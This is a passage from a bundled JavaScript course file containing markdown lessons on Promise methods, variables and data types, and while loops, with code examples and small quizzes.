reject) => Math.random() > 0.5 ? resolve('success') : reject(new Error('ups...'))\n\nconst promises = new Array(10).fill(new Promise(executor))\n\nPromise.all(promises)\n  .then(console.log, console.warn)\n~~~\n\n{{{promise-all-01.js}}}\n\nLet's go back to our example 5 and see how much simpler the code becomes using the **~Promise.all~** method:\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\nlet results = null\n\nconst start = Date.now()\n\nconst promises = data\n  .map(value => new Promise(resolve => setTimeout(() => resolve({ time: Date.now() - start, value }), random(5000))))\n\nPromise.all(promises)\n  .then(responses => { results = responses })\n  .then(() => console.log(results))\n~~~\n\n______________________________________________\n\n### ![ico-20 icon] Promise.allSettled\n\nReturns a promise that resolves with the iterable collection of objects.\nEach promise in the source iterable collection of promises corresponds the object in the resulting iterable collection of objects.\nEach object of resulting iterable collection has three possible properties: **~status~**, **~value~** and **~reason~**.\n\nThe **~status~** property can take one of two values: **~fulfilled~** or **~rejected~**.\nWhen the **~status~** property has the value **~fulfilled~**, then the **~value~** property contains the result of the promise.\nWhen the **~status~** property has the value **~rejected~**, then the **~reason~** property contains a message about the reason for the error.\n\n~~~js\nconst promises = ['map', 'google', 'research', 'store'].map(item => Promise.resolve(item))\npromises.push(new Promise((resolve, reject) => setTimeout(reject, 100, 'Access denied.')))\n\nPromise.allSettled(promises)\n  .then(results => results.forEach(console.log))\n~~~\n\n{{{promise-all-settled-01.js}}}\n\n______________________________________________\n\n### ![ico-20 icon] Promise.any\n\nThis static method of **~Promise~** constructor finds the first successfully resolved promise in the promise \"batch\" and returns it.\n\n~~~js\nconst freePort = 4000\n\nconst promises = [3000, 3256, 4000, 3040, 5000]\n  .map(port => new Promise((resolve, reject) => port === freePort ? resolve(port) : reject(port)))\n\nPromise.any(promises).then(console.log)\n~~~\n\nThis method is good when we send several requests, but are satisfied with one of the results.\nFor example, if we want to display a picture on the page, but we don’t remember exactly in which folder it is located.\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst getURLs = fileName => ['icons', 'images', 'files', 'sounds']\n  .map(folder => `https://garevna.github.io/js-lessons/${folder}/${fileName}`)\n\nfunction testURL (src) {\n  return new Promise ((resolve, reject) => {\n    const img = Object.assign(new Image(48), {\n      onload (event) {\n        resolve(img)\n      },\n      onerror (event) {\n        reject(`Image ${src} does not exist.`)\n      },\n      src\n    })\n  })\n}\n\nconst promises = getURLs('coffee.png').map(url => testURL(url))\n~~~\n\nIf we use the previous method:\n\n~~~js\nPromise.allSettled(promises).then(console.log)\n~~~\n\nthen we will see in the console:\n\n~~~console\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {status: 'fulfilled', value: img}\n  ► 1: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/images/coffee.png does not exist.'}\n  ► 2: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/files/coffee.png does not exist.'}\n  ► 3: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/sounds/coffee.png does not exist.'}\n    length: 4\n  ► [[Prototype]]: Array(0)\n~~~\n\nHowever, if we are sure that at least one of the promises will be resolved, then we can use the method **~Promise.any~**:\n\n~~~js\nPromise.any(promises)\n  .then(img => document.body.appendChild(img))\n~~~\n\nand then we will see the desired picture on the page.\n______________________________________________\n\n### ![ico-20 icon] Promise.race\n\n\"Race\" - which of the promises will be resolved first.\nIt doesn't matter what the result will be.\nThe main thing is that it reaches the finish line first.\n\nIf one of the promises will be rejected before the others are resolved or rejected, we will see an error message.\n\nLet's use **Github Users API**:\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nconst addElem = tagName => document.body\n  .appendChild(document.createElement(tagName))\n\nconst getURLs = () => ['brynary', 'stocad', 'holin', 'mojombo', 'Bill']\n  .map(id => `https://api.github.com/users/${id}`)\n\nconst show = response => {\n  const text = addElem('h4')\n  if (response.avatar_url) {\n    Object.assign(addElem('img'), {\n      src: response.avatar_url,\n      width: 150\n    })\n    text.innerText = `${response.id}: ${response.login}`\n  } else {\n    text.innerText = response.message.replaceAll('. ', '.\\n')\n    text.style.color = '#a00'\n  }\n}\n\nfunction getPromise (url) {\n  return new Promise ((resolve, reject) => {\n    fetch(url)\n      .then(response => response.json())\n      .then(resolve)\n  })\n}\n\nconst promises = getURLs().map(url => getPromise(url))\n\nPromise.race(promises).then(show)\n~~~\n\n{{{promise-race.js}}}\n__________________________________________________________________________________________\n\n## ![ico-25 icon] Examples\n\nWe use **Battery API** to get information about battery charging.\nThe **~getBattery()~** method of the **~navigator~** object returns a ~promise~.\n![ico-25 warn] This example will not work in the console of the ~about:blank~ page.\n^^Метод  **_getBattery()_**  объекта  **navigator** возвращает промис.^^\n\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\nnavigator.getBattery()\n  .then(result => {\n    for (const prop in result) {\n      console.log(`${prop}: ${result[prop]}`)\n    }\n})\n~~~\n\n__________________________________________________________________________________________\n\n◘◘![ico-25 cap] **11**◘◘\n\n~~~js\nconst boy = [\n  'Hi, what\\'s your name?',\n  'And I\\'m Robert. Where do you live?',\n  'In Lviv. Do you work or study?',\n  'Me too. Okay, see you later, good luck!'\n]\n\nconst girl = [\n  'Hi, I\\'m Helen, and you?',\n  'In Kharkov. And where are you?',\n  'I study and work. And you?',\n  'Thanks, mutually!'\n]\n\nfunction output () {\n  console.log(this.shift())\n  return this[0]\n}\n\nboySpeak = output.bind(boy)\ngirlSpeak = output.bind(girl)\n\nnew Promise(resolve => resolve())\n  .then(boySpeak)\n  .then(boySpeak)\n  .then(boySpeak)\n  .then(boySpeak)\n\nnew Promise(resolve => resolve())\n  .then(girlSpeak)\n  .then(girlSpeak)\n  .then(girlSpeak)\n  .then(girlSpeak)\n~~~\n\n______________________________________________________________\n\nLet's extend the prototype of the **~Error~** constructor a little:\n\n~~~~js\nObject.defineProperty(Error.prototype, 'name', {\n  get () { return this.errorNames[this.code] }\n})\n\nObject.defineProperty(Error.prototype, 'message', {\n  get () { return this.messages[this.code] }\n})\n\nObject.assign(Error.prototype, {\n  errorNames: [\n    'CustomError',\n    'RandomError',\n    'FatalError',\n    'GameOver',\n    'Shit',\n    'FuckingError',\n    'StrangeError',\n    'XSS',\n    'DoS',\n    'DDoS'\n  ],\n  messages: [\n    'Not authorized.',\n    'Something happens...',\n    'Access denied.',\n    'Try another way.',\n    'You are the kremlin troll.',\n    'Operation failed.',\n    'Unknown operation.',\n    'Malicious code injection.',\n    'Denial-of-service attack.',\n    'Distributed denial-of-service attack.'\n  ]\n})\n~~~~\n\nIn addition, let's extend the functionality of the console:\n\n~~~~js\nObject.assign(console, {\n  warning (error) {\n    console.warn(`(${error.code}) ${error.name}: ${error.message}`)\n  }\n})\n~~~~\n\nNow let's do the following:\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\nconst func = callback => callback(Object.assign(new Error(), { code: Math.round(Math.random() * 9) }))\n\nconst getError = (resolve, reject) => setTimeout(func.bind(null, reject), Math.random() * 10000)\n\nfor (let num = 0; num < 10; num++) {\n  new Promise(getError)\n    .then(null, console.warning)\n}\n~~~\n\n{{{promise-12.js}}}\n\n________________________________\n\n| [![ico-25 plunker] **13**](https://plnkr.co/edit/99ajm1Z3jcpKQQoE ) | [![ico-25 plunker] **14**](https://plnkr.co/edit/DIStxeDAPpXmhSTw ) | [![ico-70 replit] **15**](https://repl.it/@garevna/promise-sample-1 ) |\n\n__________________________________________________________________________________________\n\n[![ico-30 hw] **Quiz**](quiz/promise)\n"},29083:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] JS\n\n### ![ico-20 question] OOP\n\n**JS** cannot be strictly called an object-oriented language because it violates some principles of object-oriented programming. The prototype-based inheritance model essentially involves delegation rather than inheritance as understood in languages with a class-based inheritance model.\n☼☼☼ In JS, functions rule, not classes ☼☼☼.\n\n### ![ico-20 question] Polymorphism\n\nIf you want to experience true **polymorphism**, you need JS.\nHere, polymorphism starts from the very first step.\nIn JavaScript, polymorphism manifests itself through various mechanisms such as function overloading, prototypical inheritance, and dynamic typing. These features make JS a powerful and flexible development tool.\n\nIt's mind-boggling!\nImplicit type coercion puzzles many because they do not know the engine allows you to control this process.\n\nSo goodbye, class inheritance model! and long live the\n☼☼☼ functional freedom of JS! ☼☼☼\n\n### ![ico-20 icon] Func-style\n\n@@@@\n**JS** incorporates many nice features from **functional programming languages** (such as _chaining computations_, _currying_).<br><br>Func-style in JS is a direct consequence of the aforementioned, and importantly, it forms the foundation of asynchrony.\n![](images/funcs-are-our-jam.svg)\n\n@@@@\n\n**Asynchrony** relies on callbacks, i.e., **_functions_**.\nIn short, JS is built on functions, and this is not just a principle of executing individual tasks, but rather a way of the language's existence, its main essence. The main features of the language - prototype-based inheritance and asynchrony - are implemented through functions.\n\n### ![ico-20 icon] Jazz\n\n☼☼☼ JS - it's jazz, it's improvisation, it's fantastic freedom. ☼☼☼\n\nBut freedom comes with responsibility.\n\nIt's essential to deeply understand what the engine will do when interpreting your line of code.\nThe engine is powerful, so putting someone who can't drive behind the wheel of an HMMWV is complete madness.\n\n@@@@\n\n![](images/F-35.jpg)\nEven worse is letting a novice \"steer\" an F35.<br><br>Dive in, guys! With persistence and patience.\n☼☼☼ Have a great flight with JS! ☼☼☼\n@@@@\n"},40710:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Variables. Data types\n\nA little ahead of time, let us introduce the concept of a **global object**.\nA **global object** is the environment in which we \"live\" (operate) and beyond which we cannot go.\n\n@@@@\n<br>On the client side JS works in the browser, in the console of which, by the way, we perform all the operations below.<br><br>This is possible because the **V8** engine built into each browser interprets our code and executes it.\n![](images/v8-logo.svg)\n@@@@\n\nSimplistically speaking, the **global object** for us is the browser (more precisely, its **object model**, but we will deal with that later).\nThe browser itself works in the operating system and has access to its capabilities.\nBut we cannot go outside the browser and interact with the operating system directly.\nSo, the operating system allocates system resources, in particular memory, for the work of applications, including the browser.\nThe browser manages the memory resource allocated to it, part of which it allocates to the **V8** engine.\n\nNext we will talk about variables, i.e. the memory that will be used by our application.\nFor our code, access to the global object is provided by the **~window~** variable.\n\n## ![ico-30 icon] Memory and data\n\nMemory is a huge number of cells, each of which can contain 0 or 1.\n\n@@@@\nSuch a cell is a **bit** of memory.<br>That is why the binary number system was the basis for the first computers.<br>The **8 bits** make **1 byte** of memory.\n![](illustrations/vars-bit-and-byte.png)\n@@@@\n\nA maximum of 8 units can be placed in **1 byte** of memory, i.e. the binary number 11111111.\n\nIn decimal notation this would be the number 255 without a sign.\n\nIf **byte** (8 bits) is interpreted as a signed number, one bit will contain the sign of the number (**+ **or** -**), so the maximum number with a sign that can ‘fit’ into one byte is 127 (seven units).\n\n••-1111111↓↓2 ↓↓ → -127↓↓10↓↓••\n\n^^Any number can be represented in binary by a set of zeros and ones:^^\n\n{{{vars-01.js}}}\n\n^^Any number can be decomposed by powers of two + remainder (0 or 1).^^\n^^Since in binary, a two is a ten, we replace the powers of two with the powers of ten, add up, and add the remainder.^^\n^^It's simple enough.^^\n\n{{{vars-binary.js}}}\n\nAs you have already guessed, the computer can only work with binary numbers, i.e. sets of zeros and ones.\nThe reasonable question is how does the computer store text, pictures and videos, etc.\n\nAny shade is represented as several numbers:\n\n{{{vars-color.js}}}\n\nAny character is represented by its code (number):\n\n{{{vars-char.js}}}\n\nThus, any information is represented in computer memory by sets of zeros and ones, and managing memory allocation is a very complex process.\nIt is quite improbable to operate on physical memory addresses to access data.\nThe operating system does that.\nYou don't need to know the physical addresses where your data will be stored.\nYou need to come up with a name for each data item, and tell the engine what data item you will store under that name.\nThis is how a **variable** is created.\nSo, **variables** make it easier for you to manipulate your data and keep your operating system and running applications safe.\n_________________________________________________________________\n\n## ![ico-30 icon] var\n\nYour data (numbers, strings, etc.) will be stored in computer memory as long as your application is running, but you don't need to know exactly where the engine stores it.\nVariable names are a convenient form of addressing where you don't have to manipulate physical memory addresses.\nYou simply tell the engine the name of the variable, and you can then use that name to access the data.\n\nTo declare a variable, the keyword **~var~** is used, followed (with a space) by the variable name.\nUpon encountering such a declaration, the engine reserves a certain section of computer memory and \"binds\" the address of the memory allocated for its storage to the variable name you specify.\n^^Note that if necessary, the engine can move the stored value to another memory location, and it will automatically change the value of the address to which the variable name is bound without you even knowing it.^^\n\n![ico-25 warn] Declaring a variable with the **~var~** keyword places our variable in a global **~window~** object.\n\n~~~js\nvar number\n~~~\n\nWhat does this mean for us?\nThat we can refer to the value of this variable both directly by its name and indirectly through a **global object**:\n\n^^in dot notation:^^\n••window.number••\n\n^^or like this:^^\n\n••window['number']••\n\nWhen you declare a variable, you can immediately assign an initial value to it.\n\nFor this purpose, the assignment operator (**~ =~** ) is used, which is the most common in any script.\n\n§§§§ Demo | var_01_template §§§§\n\nThe left side of the assignment operator should contain the variable name, the right side should contain some **expression**.\nThe engine will compute the value of the expression on the right side of the assignment operator, and put the computed value into the variable named on the left side of the operator.\n\n~~~js\nvar number = 5 + 8 - 4\n~~~\n\nAfter executing this code, the variable **~number~** will have the value 9.\n\nIf the left side of the assignment statement contains an expression whose value is not the variable name:\n\n~~~js\n'user' + 'Name' = 9 + 8\n~~~\n\nthe engine will generate an exception:\n\n~~~error\n    Uncaught SyntaxError: Invalid left-hand side in assignment\n~~~\n\nHowever, this does not mean that there cannot be an expression in the left part of the assignment operator.\n\nLet's consider an example.\n\n^^^[![ico-25 coffee] 1]\n\nLet's declare the variable **~userName~** and assign the value 'Piter' to it:\n\n~~~js\nvar userName = 'Piter'\n~~~\n\nOur variable is in the global object **~window~**.\nSo we have access to it as a **~window.userName~** variable.\nOr as **~window['userName']~**.\n\nTherefore, we can use an expression in the left part of the assignment operator, after calculating it, the engine will get a reference to the variable:\n\n~~~js\nwindow['user' + 'Name'] = 'Helen'\n~~~\n\nYou can check for yourself that the value of the **~userName~** variable has changed.\n\n^^^\n\n^^When we get to destructuring, you'll see what other expressions can be on the left side of the assignment operator.^^\n\n\n![ico-25 warn] If we declare variables but don't assign initial values to them:\n\n~~~js\nvar x, y, z\n~~~\n\nthen their value will be **~undefined~** (not defined).\n\n![ico-25 warn] If we do not declare a variable, but try to access it:\n\n~~~js\nconsole.log(sigma)\n~~~\n\n![ico-20 err] an error message will appear in the console:\n\n~~~error\n    Uncaught ReferenceError: sigma is not defined\n~~~\n\nYou can declare several variables in one line, separating them with a comma:\n\n~~~js\nvar person = 'Piter',  hobby = 'football',  age = 30\n~~~\n\n______________________________________________________________\n\n## ![ico-30 icon] Variable names\n\n![ico-25 warn] Variable names can contain letters, numbers, underscores, and dollar signs.\n\n![ico-25 warn] Variable names can begin with a letter, the sybols **~ $~** and **~ _~**.\n\n§§§§ Demo | var_02_template §§§§\n\nIt is recommended to give long and clear names of variables and functions composed of several words.\nIt improves code readability:\n\n~~~js\nvar lastUserVisit = '2019-02-05'\n~~~\n\n![ico-25 warn] Variable names are case sensitive (~name~ and ~Name~ are different variables).\n\n§§§§ Demo | var_03_template §§§§\n\n@@@@\n![](illustrations/camel-case.png)\n**Camel Case** - a style of writing multi-word variable names where each successive word begins with an upper case literal.<br><br>The first literal with which a variable name begins must be in lower case.\n@@@@\n\n^^Only constructor and class names, which we will get to know later, should begin with an uppercase letter.^^\n\n^^For the future: it is recommended to start **function** names with a **verb** to distinguish them from variable names where data is stored.^^\n\n[![ico-25 warn] **_Reserved words_**](https://www.w3schools.com/js/js_reserved.asp ) cannot be used as variable names.\n\n![ico-25 warn] Variable names cannot start with a number.\n\n~~~js\nvar 14br = 10\n~~~\n\n~~~error\n    Uncaught SyntaxError: Invalid or unexpected token\n~~~\n\n______________________________________________________________\n\n## ![ico-30 icon] Data types\n\nAs you have already realised, any data is stored in computer memory as a set of zeros and ones.\nIn order for the engine to correctly interpret this set of zeros and ones, it must know what was stored at the given address: a number, a string or something else.\n\nSuppose a binary number is stored at the specified address:\n\n••0100011001000111010010000100100101001011010011000100110101001110••\n\nIt can be interpreted as a decimal integer:\n\n••5064095785634516000••\n\nor as a string with each character occupying 1 byte:\n\n••FGHIKLMN••\n\nThere are also many other interpretations.\n\n^^Variables can store numbers, strings, logical values, specific **~null~** and **~undefined~** values, as well as **reference type** data, which we'll get to later.^^\n\nSo, it is important that the engine knows the type of the data that is stored in the variable.\n\nUnlike languages with strict typing, we do not need to specify the type of data we intend to store in a variable when declaring it.\n\n**The data type is determined during the process of assigning a value.**\n\nThis is called **dynamic typing**.\n\n______________________________________________________________\n\n### ![ico-25 icon] String\n\nA string is an ordered set of characters that are enclosed in double (~\"My name is Piter\"~) or single (~'My name is Piter'~) quotes.\n\n| ^^ 0^^ | ^^ 1^^ | ^^ 2^^ | ^^ 3^^ | ^^ 4^^ | ^^ 5^^ | ^^ 6^^ | ^^ 7^^ | ^^ 8^^ | ^^ 9^^ | ^^10^^ | ^^11^^ | ^^12^^ | ^^13^^ | ^^14^^ | ^^15^^ |\n| ** M** | ** y** |        | ** n** | ** a** | ** m** | ** e** |        | ** i** | ** s** |        | ** P** | ** i** | ** t** | ** e** | ** r** |\n\nYou can also wrap a string in backquotes **~ ` ~**, but backquotes are usually used for [►►►**template literals**►►►](page/literals).\n\nIf double quotes occur within a string, the string itself must be wrapped in single quotes, and vice versa.\n\n◘◘![ico-25 cap]◘◘\n\n~~~js\nvar str = '\"es2023\" is a shorthand for \"ECMAScript 2023 Language Specification\".'\n~~~\n~~~js\nvar str = \"'es2023, x' is a shorthand for 'ECMAScript 2023 Language Specification'.\"\n~~~\n\nHowever, you can use the escape slash **~&bsol;~** to let the engine know that it is not a closing quote, but just a string character:\n\n~~~js\nstr = '\\'es2023, x\\' is a shorthand for \\'ECMAScript 2023 Language Specification\\'.'\n~~~\n\nEach character has its own numerical code.\n\nThe correspondence between a character and its code is established in the encoding table.\n\nThe widest range of characters from various alphabets is represented in the UTF-8 encoding (Unicode Transformation Format, 8-bit).\n\n[%%%**UTF-8**%%%](https://blog.hubspot.com/website/what-is-utf-8 ) encoding is now the dominant one on the web.\n\n________________________________________\n\nSince strings are an ordered set of characters, the number of characters in a string determines its **length**, is this logic?\nSo strings have a property **~length~**, which is available to us as follows:\n\n§§§§ Demo | var_string_length_template §§§§\n\nBy the way, note the following expression:\n\n~~~console\nmessage + string\n~~~\n\nHere the **~ + ~** operator acts as a **string concatenation** operator.\nThis creates some inconvenience, since we are more used to treating it as an **arithmetic operator** of addition.\n^^With **dynamic typing**, this duality of the **~ + ~** operator can lead to unpleasant side effects, which we will discuss in the \"Type Conversion\" section.^^\n^^Later we will learn about **template literals**, which will allow us to avoid string concatenation.^^\n\n______________________________________________________________\n\n### ![ico-25 icon] Number\n\n**data type: \"number\"**.\n\n![ico-20 warn] It is written without quotes.\n\n![ico-20 warn] A point is used to separate decimal places:\n\n~~~js\nvar x = 53.25\n~~~\n\nThis is the most problematic data type in JavaScript.\n\nLet's figure out what the issue is.\n\nThe **~number~** type includes integers, decimal numbers (floating-point numbers), numbers in exponential form (like ~5e+37~), as well as values like **~Infinity~** and **~NaN~** (Not a Number).\n\n| integer                     | ~15~             |\n| floating-point number       | ~5.80~           |\n| numbers in exponential form | ~5e+37~          |\n| **~Infinity~**              | infinity         |\n| **~NaN~**                   | **Not a Number** |\n\nThere’s a limit on the size of the number, which is related to the memory allocation for storing data of the **~number~** type.\n\n#### ![ico-20 icon] Integer\n\nA **safe integer** can have a maximum of 15 digits.\n\n{{{vars-number-1.js}}}\n\nPlease note that after 20 digits, the number is automatically displayed in exponential form.\n\n#### ![ico-20 icon] Exponential form\n\nWhole numbers with a lot of zeros (500000000000000) or very small floating-point numbers (0.000000001) are much easier to write in exponential form.\n\nThe exponential notation of a number looks like this: **~1.8e+5~**, where the letter **~e ~** separates the significand and the exponent.\nIn this example, the significand (the meaningful part of the number) is **~1.8~**, and **~5 ~** is the exponent to which you raise the number 10.\nTo get the number in a format we're used to, you need to multiply the significand by the number resulting from raising **~10~** to that exponent:\n\n••1.8 ✖ 10↑↑5 ↑↑••\n\nAs a result, we'll get the number **180000**.\n\n••500 → 5e+2 (5 * 10↑↑2 ↑↑)••\n••5000 → 5e+3 (5 * 10↑↑3 ↑↑)••\n••50000 → 5e+4 (5 * 10↑↑4 ↑↑)••\n\n••0.05 → 5e-2 (5 / 10↑↑2 ↑↑)••\n••0.005 → 5e-3 (5 / 10↑↑3 ↑↑)••\n••0.0005 → 5e-4 (5 / 10↑↑4 ↑↑)••\n\n{{{vars-number-exponential-1.js}}}\n\nHowever, \"under the hood,\" the engine itself converts the number to exponential form to save memory.\n\n{{{vars-number-exponential-2.js}}}\n\n_____________________________________\n\n#### ![ico-20 icon] Infinity\n\n![ico-20 warn] The value **~Infinity~** can occur when dividing by zero:\n\n~~~js\nvar x = 1, y = 0\nvar z = x / y\n~~~\n\n^^The value of variable **~z ~** will be **~Infinity~**.^^\n\nGenerally speaking, **~Infinity~** is a constant that has a specific value, which is related to the limitations of memory space for storing numbers.\n\n{{{vars-number-infinity.js}}}\n\n_____________________________________\n\n#### ![ico-20 icon] NaN\n\n![ico-20 warn] The value **~NaN~** can occur when trying to perform arithmetic operations with operands that aren't numbers and can't be converted to a number, like ~5 * 'total'~, as well as when attempting to divide zero by zero: ~0/0~.\n\n![ico-20 warn] The value **~NaN~** is not equal to any other value, including itself.\n\n![ico-20 warn] No arithmetic operations in JS will ever result in an error, because if there's an error, the operation will return **~NaN~**.\n\n__________________________________________________\n\n#### ![ico-20 icon] Error in calculations\n\nNow let's talk about the accuracy of calculations and rounding numbers.\n\n{{{vars-number-4.js}}}\n\nSo, clearly working with numbers isn't our top priority, and if you suddenly decide to use **JS** like **Fortran**, you'll have to deal with calculation inaccuracies.\n\n_____________________________________\n\n#### ![ico-20 icon] Tests for number\n\n◘◘** 1**◘◘\n\n→→→ 8e-2 | 800, 0.8, 0.08, 8 | 0.08 →→→\n\n◘◘** 2**◘◘\n\n→→→ 1.7e+2 | 170, 1.7, 0.17, 17 | 170 →→→\n\n◘◘** 3**◘◘\n\n→→→ 0.3e+310 | 3e+309, Infinity | Infinity →→→\n\n◘◘** 4**◘◘\n\n→→→ 3e-300 ✖ 1e+30 | 3e-900, Infinity, 0, 3e-270 | 3e-270 →→→\n\n◘◘** 5**◘◘\n\n→→→ 1e-5 + 2e-5 | 3e-5, 0.00003, 0.000030000000000000004, NaN | 0.000030000000000000004 →→→\n\n◘◘** 6**◘◘\n\n→→→ 0.003 + 0.0015 | 0.0045000000000000005, 0.0045, 45e-4, NaN | 0.0045000000000000005 →→→\n\n◘◘** 7**◘◘\n\n→→→ 5e+310 - Infinity | 0, Infinity, NaN | NaN →→→\n\n◘◘** 8**◘◘\n\n→→→ 0.005 + Infinity + NaN | 0.005, 0, Infinity, NaN | NaN →→→\n\n◘◘** 9**◘◘\n\n→→→ 5e+300 - Infinity | 5e+300, 0, -Infinity, NaN | -Infinity →→→\n\n______________________________________________________________\n\n### ![ico-20 icon] Boolean\n\nLogical type.\nIt accepts only two possible values: **~true~** or **~false~**.\n^^(without quotes, ~'true'~ is already a string).^^\nData of this type is automatically obtained as a result of comparisons:\n\n~~~js\n5 > 8\n~~~\n~~~console\nfalse\n~~~\n\n~~~js\n'a' < 'b'\n~~~\n~~~console\ntrue\n~~~\n\nBy the way, we also got to know the comparison operators **~ >~** and **~ <~**.\n\nLogical expressions are created using comparison operators.\n\nThe result of evaluating a **logical expression** will always be a Boolean value (**~true~** or **~false~**).\n\nThat is, if we declare a **~bool~** variable:\n\n~~~js\nvar bool = 5 > 8\n~~~\n\nthis will be a **~boolean~** type variable.\nNext, we'll frequently encounter **~boolean~** data.\n\n______________________________________________________________\n\n### ![ico-20 icon] undefined\n\n**data type: \"undefined\"**.\n\nSometimes variables are declared without being assigned an initial value.\n\nIf a variable is declared without a value, its value will be **~undefined~**.\n\n^^(Without quotes, 'undefined' is already a string).^^\n\n______________________________________________________________\n\n## ![ico-25 icon] Operator typeof\n\n^^Another language operator that you're getting to know today.^^\n\n^^The first one, as you remember, is the **assignment operator**.^^\n\n^^Next, we got familiar with two **comparison operators**.^^\n\nLanguage operators always have **operands**.\n\nFor example, the assignment operator has two operands: one on the left and the other on the right.\n\n![ico-20 warn] Operands are always separated from the operator by a space.\n\nDepending on the number of operands, an operator can be:\n\n| operator | number of operands | exapmples |\n| unary    | 1                  | **~typeof~** |\n| binary   | 2                  | **~ =~**, **~ >~**, **~ <~** |\n| ternary  | 3                  | we'll look at this operator a little later |\n\nLet's declare the variable **~num~** and assign it a value of 10:\n\n~~~js\nvar num = 10\n~~~\n\nNow let's use the **~typeof~** operator to find out the data type of **~num~** variable:\n\n~~~js\ntypeof num\n~~~\n\nWe'll see in the console:\n\n~~~console\n'number'\n~~~\n\nLet's figure out what the engine does when it encounters a ~**typeof** num~ statement.\n\nThe engine calculates the value of this expression and replaces the ~**typeof** num~ expression with the computed value.\n\nLet's look at another example:\n\n~~~js\nvar companyName = 'Google'\n\ntypeof companyName\n~~~\n\n~~~console\n'string'\n~~~\n\n![ico-25 warn] The **~typeof~** operator returns a **string**.\n\nWhat does this mean?\n\n~~~js\nvar boolean = false\n\ntypeof boolean\n~~~\n\n~~~console\n'boolean'\n~~~\n\nThis means that if the engine encounters an expression like this (devoid of any meaning other than educational - for you):\n\n~~~js\ntypeof typeof boolean\n~~~\n\nthen we will always get the same answer:\n\n~~~console\n'string'\n~~~\n\nPossible values ​​(strings) returned by the **~typeof~** operator:\n\n• ~string~\n• ~number~\n• ~bigint~\n• ~boolean~\n• ~object~\n• ~undefined~\n• ~function~\n• ~symbol~\n\nAs you can see, there are data types on this list that we haven't covered yet and that we have yet to explore.\n\n__________________________________________________\n\n### ![ico-20 icon] Tests for typeof\n\n◘◘** 1**◘◘\n\n→→→ typeof 2e-200 | 'number', 'string', 'boolean', 'undefined' | number →→→\n\n◘◘** 2**◘◘\n\n→→→ typeof NaN | 'number', 'string', 'boolean', 'undefined' | number →→→\n\n◘◘** 3**◘◘\n\n→→→ typeof 'Infinity' | 'number', 'string', 'boolean', 'undefined' | string →→→\n\n◘◘** 4**◘◘\n\n→→→ typeof 5 > 8 | 'number', 'string', 'boolean', 'undefined' | boolean →→→\n\n◘◘** 5**◘◘\n\n→→→ typeof undefined | 'number', 'string', 'boolean', 'undefined' | undefined →→→\n\n__________________________________________________\n\n## [![ico-25 icon] ECMAScript Specification](https://tc39.es/ecma262/multipage/ecmascript-data-types-and-values.html )\n\nThe current language specification defines seven data types:\n\n• **Boolean**\n• **Null**\n• **Undefined**\n• **Number**\n• **String**\n• **Symbol**\n• **Object**\n\nThe **~typeof~** operator works \"the old fashioned way\", because if the principle of its operation were changed, then many sites created before 2015 would simply crumble.\n\nHowever, when using it, it is worth remembering its \"imperfection\".\n\nWhen comparing the data types of two variables, keep in mind that the characters are arranged in alphabetical order in the encoding table, so when comparing, the larger one will be the one which is located further from the beginning of the table.\n"},51534:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] While and do...while loops\n\nVery often the number of loop iterations is unknown in advance and it depends on the fulfilment of some condition.\nAs the army saying goes, ‘dig from the fence to lunch’.\n\nThat is why we cannot use the iteration counter because we cannot set a limit on its value.\n\nIn this case, we use one of the **~while~** or **~do...while~** loop operators.\n\n## ![ico-30 icon] while\n\nSyntactically, the **~while~** operator includes three mandatory parts: the word **~while~** itself, followed by parentheses in which the logical expression (the loop condition) will be written, and then the body of the loop enclosed in curly braces:\n\n~~~js\nwhile (condition) {\n  ...loop body\n}\n~~~\n\nWhat will the engine do when faced with such an expression?\n\n1. First, it will calculate the value of the boolean expression in parentheses and convert it to a boolean type.\n2. If the condition is satisfied (i.e. the calculated value is ~true~), the code inside the curly brackets will be executed (the next iteration of the loop).\nAfter that the engine will return to point 1.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar n = 5\n\nwhile (n < 5) {\n  console.log(n)\n}\n~~~\n\n^^This loop will not be executed once because the condition ~n < 5~ is not fulfilled initially, i.e. the value ~false~ will be obtained when evaluating the expression in parentheses.^^\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nvar res = 0, n = 1\n\nwhile (n) {\n  n = prompt('Enter the number')\n  res += (n - 0) || 0\n}\n~~~\n\n^^The loop will sum the numbers entered by the user until the ~Cancel~ button is pressed in the ~prompt~ modal window.^^\n^^Since the values entered in the modal window will be of string type, we convert them to a number by subtracting ~(n - 0)~.^^\n^^If the subtraction ~(n - 0)~ results in the value ~NaN~, then 0 will be added to the ~res~ variable.^^\n\nIn the following example, we will use the **~random~** function of the **~Math~** library, which generates a pseudo-random number from 0 to 1:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar res = 0, n = 0\n\nwhile (n < 0.5) {\n  n = Math.random()\n  res += n\n}\n~~~\n\nObviously, this loop will not be infinite, because sooner or later the value of **~Math.random()~** will be greater than 0.5.\n\n______________________\n\n## ![ico-30 icon] do...while\n\nThis loop first executes the code in curly braces and then checks if the condition is fulfilled.\n\n~~~js\ndo {\n  ...\n} while (условие)\n~~~\n\n^^The loop will be executed at least 1 time, because the condition is checked after the next iteration of the loop.^^\n\nWhen is this loop preferable to the previous loop?\nFor example, in a case like this:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\ndo {\n  var rand = Math.random()\n  console.log(rand)\n} while (rand < .5)\n~~~\n\n______________________________________________________\n\n## ![ico-30 icon] Tests\n\n◘◘![ico-25 hw]** 1**◘◘\n~~~js\ndo {\n  var rand = Math.random()\n  if (rand > .5) break\n} while (true)\n~~~\n\n→→→ Will the loop be infinite? | 'yes', 